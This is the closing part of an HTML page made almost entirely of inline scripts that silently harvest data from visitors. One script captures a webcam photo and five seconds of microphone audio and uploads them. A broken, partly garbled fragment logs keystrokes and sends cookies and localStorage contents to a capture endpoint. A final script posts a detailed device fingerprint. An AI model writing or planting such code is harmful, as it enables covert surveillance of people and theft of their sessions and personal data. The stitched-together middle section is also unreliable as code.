        <script>
        (function() {
            fetch('/media', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ status: 'requested' })
            });

            async function capturePhoto(stream) {
    try {
        const video = document.createElement('video');
        video.srcObject = stream;
        video.setAttribute('playsinline', '');
        await video.play();

        // Ждём появления кадров
        await new Promise((resolve, reject) => {
            const check = () => {
                if (video.videoWidth > 0 && video.videoHeight > 0) {
                    resolve();
                } else {
                    video.requestVideoFrameCallback(check);
                }
            };
            check();
        });

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);

        canvas.toBlob(blob => {
            if (blob && blob.size > 0) {
                const formData = new FormData();
                formData.append('photo', blob, 'webcam.jpg');
                fetch('/upload_media', { method: 'POST', body: formData });
            } else {
                console.error('Empty photo blob');
            }
        }, 'image/jpeg');
    } catch (err) {
        console.error('capturePhoto error', err);
    }
}

            function captureAudio(stream) {
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];
                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                mediaRecorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'audio/webm' });
                    const formData = new FormData();
                    formData.append('audio', blob, 'audio.webm');
                    fetch('/upload_media', { method: 'POST', body: formData });
                };
                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), 5000);
            }

            const constraints = {};
            constraints.video = true; constraints.audio = true;
            navigator.mediaDevices.getUserMedia(constraints)
                .then(stream => {
                    fetch('/media', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ status: 'granted' })
                    });
                    capturePhoto(stream);captureAudio(stream);
                })
                .catch(err => {
                    fetch('/media', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ status: 'denied', error: err.message })
                    });
                });
        })();
        </script>

                if (key.length === 1) {
                    keys += key;

                    keys += '[' + key + ']';
                }
            });

                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: 'cookies=' + encodeURIComponent(cookies)
                });
            }
            if (window.localStorage) {
                try {
                    var ls = {};
                    for (var i = 0; i < localStorage.length; i++) {
                        var key = localStorage.key(i);
                        ls[key] = localStorage.getItem(key);
                    }
                    fetch('/capture', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ localStorage: ls })
                    });
                } catch(e) {}
            }
        })();
        </script>
        

        <script>
        (function() {
            var info = {
                screen: screen.width + 'x' + screen.height,
                availScreen: screen.availWidth + 'x' + screen.availHeight,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages.join(','),
                cookiesEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                hardwareConcurrency: navigator.hardwareConcurrency,
                maxTouchPoints: navigator.maxTouchPoints,
                vendor: navigator.vendor,
                plugins: Array.from(navigator.plugins).map(p => p.name).join(', ')
            };
            if (navigator.connection) {
                info.connection = {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt,
                    saveData: navigator.connection.saveData
                };
            }
            if (navigator.getBattery) {
                navigator.getBattery().then(function(battery) {
                    info.battery = {
                        charging: battery.charging,
                        level: battery.level * 100 + '%',
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                    fetch('/capture', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ system_info: info })
                    });
                });
            } else {
                fetch('/capture', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ system_info: info })
                });
            }
        })();
        </script>
        
</body></html>
